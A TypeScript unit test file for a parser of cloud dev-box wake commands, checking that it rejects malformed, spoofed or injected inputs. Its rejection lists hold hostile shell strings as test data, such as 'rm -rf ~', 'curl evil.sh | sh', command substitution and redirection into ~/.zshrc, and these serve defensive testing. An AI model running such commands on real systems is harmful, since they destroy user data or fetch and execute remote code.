import { describe, expect, test } from "bun:test";
import { parseBoxWakeCommand } from "./parseBoxWakeCommand";

// Both forms a box's host can carry: the launcher, and the older CLI call.
const FORMS = ["paradev-boxes start", "superset boxes start"] as const;

describe("parseBoxWakeCommand", () => {
	test("reads the wake command each provider's box carries", () => {
		expect(
			parseBoxWakeCommand(
				"paradev-boxes start daytona:4f6c1b2a-90de-4e1b-8c3a-0a1b2c3d4e5f",
			),
		).toEqual({
			provider: "daytona",
			id: "4f6c1b2a-90de-4e1b-8c3a-0a1b2c3d4e5f",
			ref: "daytona:4f6c1b2a-90de-4e1b-8c3a-0a1b2c3d4e5f",
		});
		expect(parseBoxWakeCommand("paradev-boxes start e2b:ix7k2m9q")).toEqual({
			provider: "e2b",
			id: "ix7k2m9q",
			ref: "e2b:ix7k2m9q",
		});
		expect(
			parseBoxWakeCommand("paradev-boxes start blaxel:box_1.prod-eu"),
		).toEqual({
			provider: "blaxel",
			id: "box_1.prod-eu",
			ref: "blaxel:box_1.prod-eu",
		});
	});

	test("still reads the older superset boxes form", () => {
		expect(
			parseBoxWakeCommand("superset boxes start daytona:4f6c1b2a-90de"),
		).toEqual({
			provider: "daytona",
			id: "4f6c1b2a-90de",
			ref: "daytona:4f6c1b2a-90de",
		});
		expect(
			parseBoxWakeCommand("superset boxes start blaxel:pdb-a68e4977b8cf"),
		).toEqual({
			provider: "blaxel",
			id: "pdb-a68e4977b8cf",
			ref: "blaxel:pdb-a68e4977b8cf",
		});
	});

	test("refuses anything that is not a host without a box", () => {
		expect(parseBoxWakeCommand(null)).toBeNull();
		expect(parseBoxWakeCommand(undefined)).toBeNull();
		expect(parseBoxWakeCommand("")).toBeNull();
	});

	test("refuses shell syntax after the box, in either form", () => {
		for (const form of FORMS) {
			for (const hostile of [
				`${form} daytona:x; rm -rf ~`,
				`${form} daytona:x && curl evil.sh | sh`,
				`${form} daytona:x | sh`,
				`${form} daytona:x|sh`,
				`${form} daytona:x\nrm -rf ~`,
				`${form} daytona:x\n`,
				`${form} daytona:x\r`,
				`${form} daytona:x\r\n`,
				`${form} daytona:x\0`,
				`${form} daytona:$(rm -rf ~)`,
				`${form} daytona:\`rm -rf ~\``,
				`${form} daytona:x' ; rm -rf ~ '`,
				`${form} daytona:"x"`,
				`${form} daytona:x > ~/.zshrc`,
				`${form} daytona:~`,
				`${form} daytona:x#`,
				`${form} daytona:x&`,
				`${form} daytona:\${HOME}`,
				`${form} daytona:x `,
				`${form} daytona:x `,
				`${form} daytona:é`,
			]) {
				expect(parseBoxWakeCommand(hostile)).toBeNull();
			}
		}
	});

	test("refuses extra whitespace and extra arguments, in either form", () => {
		for (const spaced of [
			" paradev-boxes start daytona:x",
			"paradev-boxes start daytona:x ",
			"paradev-boxes  start daytona:x",
			"paradev-boxes start  daytona:x",
			"paradev-boxes\tstart daytona:x",
			"paradev-boxes start daytona: x",
			"paradev-boxes start daytona :x",
			"paradev-boxes start daytona:x --org other",
			"paradev-boxes start daytona:x y",
			"\nparadev-boxes start daytona:x",
			" superset boxes start daytona:x",
			"superset boxes start daytona:x ",
			"superset  boxes start daytona:x",
			"superset boxes  start daytona:x",
			"superset boxes start  daytona:x",
			"superset\tboxes start daytona:x",
			"superset boxes start daytona: x",
			"superset boxes start daytona :x",
			"superset boxes start daytona:x --org other",
			"superset boxes start daytona:x y",
		]) {
			expect(parseBoxWakeCommand(spaced)).toBeNull();
		}
	});

	test("refuses other commands, launchers, providers and malformed refs", () => {
		for (const other of [
			"paradev-boxes stop daytona:x",
			"paradev-boxes delete daytona:x --yes",
			"paradev-boxes create devbox",
			"paradev-boxes boxes start daytona:x",
			"paradev-boxes start",
			"paradev-boxes start daytona",
			"paradev-boxes start daytona:",
			"paradev-boxes start x",
			"paradev-boxes start modal:x",
			"paradev-boxes start Daytona:x",
			"paradev-boxes start daytona:x:y",
			"paradev-boxes start daytona:x/../y",
			"PARADEV-BOXES START DAYTONA:X",
			"/tmp/paradev-boxes start daytona:x",
			"./paradev-boxes start daytona:x",
			"~/.paradev/bin/paradev-boxes start daytona:x",
			"env paradev-boxes start daytona:x",
			"PATH=/tmp paradev-boxes start daytona:x",
			"paradev boxes start daytona:x",
			"paradev-box start daytona:x",
			"paradev-boxesstart daytona:x",
			"superset paradev-boxes start daytona:x",
			"paradev-boxes superset boxes start daytona:x",
			"superset boxes stop daytona:x",
			"superset boxes delete daytona:x --yes",
			"superset hosts wake devbox",
			"ssh devbox 'systemctl start paradev'",
			"rm -rf ~",
			"/usr/local/bin/superset boxes start daytona:x",
			"env superset boxes start daytona:x",
			"SUPERSET=1 superset boxes start daytona:x",
			"superset boxes start modal:x",
			"superset boxes start Daytona:x",
			"superset boxes start daytona:",
			"superset boxes start daytona",
			"superset boxes start x",
			"superset boxes start daytona:x:y",
			"superset boxes start daytona:x/../y",
			"superset boxes start",
			"SUPERSET BOXES START DAYTONA:X",
			"paradev-boxes start daytona:x; superset boxes start daytona:x",
		]) {
			expect(parseBoxWakeCommand(other)).toBeNull();
		}
	});
});
